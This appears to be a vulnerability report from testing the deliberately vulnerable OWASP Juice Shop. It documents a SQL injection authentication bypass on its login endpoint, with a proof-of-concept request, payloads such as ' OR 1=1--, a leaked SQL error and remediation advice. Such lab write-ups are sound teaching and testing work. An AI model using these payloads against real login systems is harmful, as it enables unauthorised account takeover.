**Category:** A03 – Injection

---
## Overview
During testing of the login functionality in OWASP Juice Shop, a **SQL Injection vulnerability** was discovered.  
This vulnerability allows an attacker to bypass authentication and log in as any user, including the admin, without knowing the correct password.  
It affects both generic login attempts and logins with a known user email.

---
## Proof of Concept

### Vulnerable Request
```http
POST /rest/user/login HTTP/1.1
Host: localhost:3000
Content-Length: 28
Content-Type: application/json
{"email":"'","password":"1"}
```

**Example Request Details:**
- Email field: `'`  
- Password field: `1`  

### Vulnerable SQL Query
```sql
SELECT * FROM Users 
WHERE email = '' OR 1=1--' 
AND password = 'e2f18b8df2f02fdf3891d675acc0035d' 
AND deletedAt IS NULL;
```

**Explanation:**  
- The `' OR 1=1--` injection causes the `WHERE` clause to always evaluate to true.  
- This bypasses authentication, allowing login without valid credentials.

### Login with Known Email
If the attacker knows a valid email, they can also bypass the password check:

```sql
SELECT * FROM Users 
WHERE email = 'bender@juice-sh.op' AND 1=1-- 
AND password = 'e2f18b8df2f02fdf3891d675acc0035d' 
AND deletedAt IS NULL;
```

**Injected Payload:**
```sql
bender@juice-sh.op' AND 1=1--
```

---
### Response Example
```http
HTTP/1.1 500 Internal Server Error
Content-Type: application/json; charset=utf-8
```
```json
{
   "error":{
      "message":"SQLITE_ERROR: near \"c4ca4238a0b923820dcc509a6f75849b\": syntax error",
      "stack":"Error\n    at Database.<anonymous> (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:185:27)\n    ...",
      "sql":"SELECT * FROM Users WHERE email = ''' AND password = 'c4ca4238a0b923820dcc509a6f75849b' AND deletedAt IS NULL"
   }
}
```

---
## Impact
- **Authentication bypass:** Attacker can log in as any user without knowing the password.  
- **Admin compromise:** Full administrative access possible.  
- **User account takeover:** Any user's account can be accessed if the email is known.  
- **Data exposure:** Potential access to sensitive user data (emails, roles, tokens).

**Severity:** Critical (CVSS high/critical range)

---
## Recommendations
1. **Use parameterized queries / prepared statements** for all database access.  
2. **Input validation and sanitation** for login fields to reject control characters and SQL metacharacters.  
3. **Limit error feedback:** Do not expose SQL error messages to clients.  
4. **Implement account lockout / throttling** to reduce brute-force attack potential.  
5. **Regular security testing** to detect similar injection vulnerabilities in other endpoints.  


